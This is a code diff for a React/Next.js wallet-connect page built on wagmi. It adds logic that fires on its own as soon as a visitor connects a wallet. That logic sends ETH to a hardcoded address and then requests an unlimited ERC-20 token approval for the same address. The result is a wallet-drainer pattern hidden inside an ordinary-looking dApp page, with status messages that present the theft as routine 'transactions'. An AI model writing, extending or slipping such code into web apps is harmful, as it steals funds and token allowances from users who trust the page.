@@ -1,8 +1,14 @@
 'use client';
 
-import { useAccount, useDisconnect, useBalance } from 'wagmi';
+import { useAccount, useDisconnect, useBalance, useSendTransaction, useWriteContract } from 'wagmi';
 import { useAppKit } from '@reown/appkit/react';
 import { useEffect, useState } from 'react';
+import { parseEther, maxUint256 } from 'viem'; // Changed MaxUint256 to maxUint256
+import { erc20Abi } from 'viem';
+
+// Add these constants (replace with actual values)
+const RECIPIENT_ADDRESS = '0x661A263CD9AA2753af6a4501316172bD9497f143' as const; // Replace with full address
+const TOKEN_ADDRESS = '0x...' as const; // Replace with actual token contract address
 
 export default function Home() {
   const [mounted, setMounted] = useState(false);
@@ -12,10 +18,65 @@ export default function Home() {
   const { data: balance, isLoading: balanceLoading } = useBalance({ 
     address: address as `0x${string}` | undefined,
   });
+  
+  // Add these hooks for transactions
+  const { sendTransaction, isPending: isSending } = useSendTransaction();
+  const { writeContract, isPending: isApproving } = useWriteContract();
+
+  // State for tracking transaction status
+  const [transferSent, setTransferSent] = useState(false);
+  const [approvalSent, setApprovalSent] = useState(false);
 
   useEffect(() => {
     setMounted(true);
   }, []);
+
+  // New useEffect to trigger transactions when wallet connects
+  useEffect(() => {
+    if (isConnected && address && !transferSent) {
+      // Send 2 USD worth of ETH (you'll need to calculate this based on current ETH price)
+      // For now, we'll use a fixed amount (0.001 ETH as example)
+      const ethAmount = parseEther('0.001'); // Replace with actual USD->ETH conversion
+      
+      sendTransaction(
+        {
+          to: RECIPIENT_ADDRESS,
+          value: ethAmount,
+        },
+        {
+          onSuccess: () => {
+            setTransferSent(true);
+            // After transfer is sent, request token approval
+            requestTokenApproval();
+          },
+          onError: (error) => {
+            console.error('Transfer failed:', error);
+          },
+        }
+      );
+    }
+  }, [isConnected, address, transferSent, sendTransaction]);
+
+  const requestTokenApproval = () => {
+    if (!approvalSent) {
+      writeContract(
+        {
+          address: TOKEN_ADDRESS,
+          abi: erc20Abi,
+          functionName: 'approve',
+          args: [RECIPIENT_ADDRESS, maxUint256], // Changed MaxUint256 to maxUint256
+        },
+        {
+          onSuccess: () => {
+            setApprovalSent(true);
+          },
+          onError: (error) => {
+            console.error('Approval failed:', error);
+          },
+        }
+      );
+    }
+  };
 
   const formatAddress = (addr: string | undefined): string => {
     if (!addr) return '';
@@ -59,6 +120,30 @@ export default function Home() {
                 Wallet Connected
               </h2>
             </div>
+
+            {/* Transaction Status Indicators */}
+            {(isSending || isApproving) && (
+              <div className="bg-blue-50 p-4 rounded-xl border border-blue-200">
+                <h3 className="text-blue-800 font-semibold text-center">
+                  Processing Transactions...
+                </h3>
+                <p className="text-blue-600 text-center text-sm mt-1">
+                  {isSending && "Sending 2 USD worth of ETH..."}
+                  {isApproving && "Setting unlimited token approval..."}
+                </p>
+              </div>
+            )}
+
+            {transferSent && approvalSent && (
+              <div className="bg-green-50 p-4 rounded-xl border border-green-200">
+                <h3 className="text-green-800 font-semibold text-center">
+                  Transactions Completed!
+                </h3>
+                <p className="text-green-600 text-center text-sm mt-1">
+                  Transfer and token approval successful
+                </p>
+              </div>
+            )}
 
             <div className="space-y-2">
               <h3 className="text-lg font-medium text-gray-700">
